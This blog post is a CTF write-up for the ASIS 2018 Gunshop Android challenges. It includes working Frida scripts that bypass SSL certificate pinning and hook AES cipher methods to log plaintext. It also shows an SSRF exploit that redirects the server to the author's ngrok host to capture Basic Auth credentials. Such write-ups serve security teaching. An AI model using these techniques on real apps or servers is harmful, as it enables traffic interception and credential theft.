--- 
title: ASIS CTF Finals 2018 - Gunshop and Gunshop II
layout: post 
date: '2018-11-26 11:15:00'
description: Writeup of Gunshop and Gunshop II
image: https://i.imgur.com/pGMsDuA.png
tags:
- ctf
- writeup
author: Rafael "rasknikov" Correia
---

## One Frida script for two Flags

ASIS 2018 Gunshop and Gunshop II challenges were about an Android app. And I love reversing Android apps. Here is the Write-up for the two challenges, as the same script will resolve both.

## Gunshop

### Description

>Login to the underground bloody shop.

### Write-up

The first thing I try when I see an Android app is reversing it.

For a CTF as ASIS I was expecting an obfuscated app, so it was there, obfuscated as hell.

![obfuscated](https://i.imgur.com/nMrr7Ov.png)

The second thing I try when I do an analysis on an Android app is intercept its traffic with Burp Suite. So, I uploaded the app to my Genymotion instance, configured my connection to use the proxy on my host machine and set as trust the Burp's CA. I did this and the second obstacle showed up:

![sslpinerror](https://i.imgur.com/TyVmlZm.png)

To see the traffic on Burp I need to bypass this SSL pinning. There are several ways to achieve a certain level of certificate pinning, so I need to understand how this is done.

I found the `m` class, where all the cryptographic methods were being done. What method is being used to do the SSL Pinning? 

Two lines caught my attention:

The first one looks like a hash and could be used to test the certificate:

```java
    public static final Set a = new HashSet(Arrays.asList(new String[] { "b1bc3b5a0ccac02a1003642873290f38afb4d7d1c514dff9cf8ec26dd7027b68" }));
```

The second is getting the certificate from the accessed URL to check something:

```java
    paramHttpsURLConnection = ((X509Certificate)arrayOfCertificate[i]).getPublicKey().getEncoded();
```

 I analyzed a bit further and that was right: the method

```java
    public static boolean a(HttpsURLConnection paramHttpsURLConnection, Set paramSet)
```

was the responsible for the certificate pinning. I spent some time thinking how to add my certificate hash to it but it was easier to use Frida.

Frida is the best tool for Android instrumentation as it easy to hook methods and change the behavior of the app as you like. I upload the `frida-server` to my Android (`adb push`), ran it (`./frida-server & `) and started to code my script.

To use it on Frida I needed the app ID and I found it inside the `m` class:

![appid](https://i.imgur.com/39vZyg2.png)

There are a handful of ways to find it but as I was checking the `m` class this line was screaming for me.

The first thing I did using Frida was to call directly `m.a("configUrl", this);` and `m.a("configKey", this);`. These two calls were done inside the MainActivity so they must be important. The Frida script for this:

```java
    Java.perform(
        function () {
            Java.choose("android.gunshop.com.gunshop.MainActivity", {
                onMatch: function (instance) {
                    var m = Java.use("android.gunshop.com.gunshop.m");
                    console.log(m.a("configUrl", instance));
                    console.log(m.a("configKey", instance));                
                },
                onComplete: function () {}
            });
        }
    )
```

And the result:

![configurlkey](https://i.imgur.com/J9iI9h1.png)

The `configUrl` was the URL of the API and the `configKey`... well, I have no idea. I need to be honest here: I got the two flags without knowing how the cryptographic process was implemented as I will explain further in the write-up.

Let's hook the SSL pinning method. As showed before, this method returns `boolean` after the check. So, let's return `true` in all cases. I needed to use `overload` on Frida as there were several methods with the same name. Changed my code to run it directly:

```java
    Java.perform(
        function () {
            var m = Java.use("android.gunshop.com.gunshop.m");
            //Cert pinning bypass
            m.a.overload("javax.net.ssl.HttpsURLConnection", "java.util.Set").implementation = function () {
                return true;
            };
        }
    )
```

As I changed the SSL pinning method's implementation I could now intercept using Burp Suite.

![burp_intercept](https://i.imgur.com/1H7OwsF.png)

![usernamenotfound](https://i.imgur.com/2P6QshJ.png)

How to get a valid user? The filename is obvious a tip, so let's find a download endpoint.

Inside the `a` class there was something probably useful:

![getfile1](https://i.imgur.com/NSdloyW.png)

Can I download the file using this endpoint? Yes, I can. Here is the valid credential:

![credential](https://i.imgur.com/qT1y5gj.png)

And then I can see the Gunshop:

![gunshop](https://i.imgur.com/pGMsDuA.png)

A brief period of success. After some check I saw that all the payloads were being ciphered. Here I need to say I spent some hours trying to understand the cryptographic process and I failed. Maybe I was using wrong parameters, maybe the code was using some kind of dynamic keys, but I failed. So, I thought: gosh, I'm using Frida. Let's see the data inside the cryptographic method!

And where are the cryptographic methods?

Man, I read the `m` class so many times that I already knew `AES-ECB` was being used somewhere:

![aes_ecb_a](https://i.imgur.com/LcHqTk8.png)

But it's usual to have different methods for cipher and decipher and I search for another `AES/ECB/PKCS5Padding` string. And a `b` method showed up:

![aes_ecb_b](https://i.imgur.com/40L5FVN.png)

Which one is cipher and which one is decipher? Simple: if Base64 is the last method being called before return, it is usually cipher. And when Base64 is being called before the cryptographic process, it is usually decipher. `a` was my cipher method, `b` my decipher one.

I overloaded the two methods using Frida, but one thing was different: I called the method using the original parameters and return the original output. For the app it was transparent, but I was seeing its parameters and return value.

```java
    //View before Encrypt
    m.a.overload("java.lang.String", "java.security.Key").implementation = function (str, key) {
        var ret = this.a(str, key)
        console.log("Plain: " + str)
        return ret
    };

    //View after Decrypt
    m.b.overload("java.lang.String", "java.security.Key").implementation = function (str, key) {
        var ret = this.b(str, key)
        console.log("Plain: " + ret)
        return ret
    };
```

All the texts showed up in plaintext. Including the flag, among all the weapons:

![deciphered](https://i.imgur.com/x7JMudo.png)

Flag: `ASIS{d0Nt_KI11_M3_G4NgsteR}`

## Gunshop II

### Description

>Login to the City Center Shop. A weapon is there, waiting for a worthy warrior to take it!

### Write-up

So, where is the City Center Shop? After the decipher/cipher hook using Frida all was clear and the URL showed up in the last steps.

![citycentershop](https://i.imgur.com/BjBnD9T.png)

Let's access it:

![method_not_allowed](https://i.imgur.com/JHgqTdf.png)

Let's go to Burp and change the method from `GET` to `POST`:

![unauthorized](https://i.imgur.com/e6pvN79.png)

`401` and a Basic Authentication hint. I tried several auths (including the `alfredo` credential from Gunshop) and I received `401` for all the tries. So, where is the credential? No guessing was needed until now, so let's think. How did I find this URL?

The URL was being sent to the backend in the last step. URL being sent to backend... maybe the server is connecting to this URL and this is a `SSRF` vulnerability. So, how to pass my URL to the method as it is using payload encryption? The easiest thing that came to my mind was replace the URL before sending it to the server. I set a `ngrok` and create a replace before the encryption:

```java
    //View before Encrypt + SSRF replace
    m.a.overload("java.lang.String", "java.security.Key").implementation = function (str, key) {
        str = str.replace(/http:\\\/\\\/188.166.76.14:42151\\\/DBdwGcbFDApx93J3/, 'https:\\/\\/a7af3844.ngrok.io')
        var ret = this.a(str, key)
        console.log("Plain: " + str)
        return ret
    };
```

(I spent some time trying to get the replace working because of the backslash and the slash hell :P)

The URL was sent:

![ngrok1](https://i.imgur.com/CrJx46h.png)

And this worked!

![ngrok2](https://i.imgur.com/PKCfwT4.png)

I used the authorization, and voilà:

![authorized](https://i.imgur.com/bGxXswc.png)

Flag: `ASIS{0Ld_B16_br0Th3r_H4d_a_F4rm}`

So, one Frida script (and several hours) got me 2 flags:

```java
    Java.perform(
        function () {
            var m = Java.use("android.gunshop.com.gunshop.m");
            
            //Cert pinning bypass
            m.a.overload("javax.net.ssl.HttpsURLConnection", "java.util.Set").implementation = function () {
                return true;
            };

            //View before Encrypt + SSRF replace
            m.a.overload("java.lang.String", "java.security.Key").implementation = function (str, key) {
                str = str.replace(/http:\\\/\\\/188.166.76.14:42151\\\/DBdwGcbFDApx93J3/, 'https:\\/\\/a7af3844.ngrok.io')
                var ret = this.a(str, key)
                console.log("Plain: " + str)
                return ret
            };

            //View after Decrypt
            m.b.overload("java.lang.String", "java.security.Key").implementation = function (str, key) {
                var ret = this.b(str, key)
                console.log("Plain: " + ret)
                return ret
            };
        }
    )
```

## Thanks

Thank you Alisson for helping me in getting Frida to work properly and thank you ASIS for these two fun challenges! :)
